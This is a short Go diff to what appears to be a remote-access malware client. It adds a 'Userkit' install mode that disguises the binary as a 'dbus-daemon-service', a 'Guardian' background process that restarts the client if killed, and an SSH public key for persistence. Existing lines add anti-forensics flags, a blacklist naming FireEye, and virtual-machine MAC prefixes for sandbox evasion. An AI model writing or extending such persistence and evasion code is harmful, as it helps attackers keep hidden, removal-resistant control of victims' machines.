@@ -23,6 +23,18 @@ var (
 	AntiForensics         bool = false
 	AntiForensicsResponse int  = 0
 
+	Install   bool = false // Enables Userkit and Install
+	SmartCopy bool = false // Overrides InstallNames, etc.
+
+	Guardian bool = false // Spawns a script in the background to restart the client if killed
+
+	InstallNames          = [...]string{"dbus-daemon-service"}     // Possible names for the client to install with
+	InstallFolderName     = [...]string{"dbus-service"}            // Possible folder names for the client to install with
+	InstallUserLocations  = [...]string{"~/.local/share"}          // Standard user location
+	InstallAdminLocations = [...]string{"/usr/local/bin"}          // Standard admin location
+
+	SSHPubKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5..." // Public key for SSH persistence
+
 	BlacklistCountries     = [...]string{"Singapore"} //Country you DO NOT want the Client to run in
 	BlacklistOrganizations = [...]string{"FireEye"}
 	BadMACList             = []string{"00:0c:29", "00:50:56", "08:00:27", "52:54:00 ", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28", "00:01:5D", "00:21:F6", "00:A0:A4", "00:07:82", "00:03:BA", "08:00:20", "2C:C2:60", "00:10:4F", "00:0F:4B", "00:13:97", "00:20:F2", "00:14:4F"}
@@ -50,8 +62,18 @@ func Boot() {
 			}
 		}
 	}
-	// Check if first run
-	// install if needed
+
+	AdminState = isRoot()
+	if CheckFirstBoot() {
+		if Install {
+			UserKitInstall() // Leads to Client Exit
+		}
+	}
+
+	if Guardian {
+		go StartGuardian()
+	}
+
 	// load information
 	// start routines
 
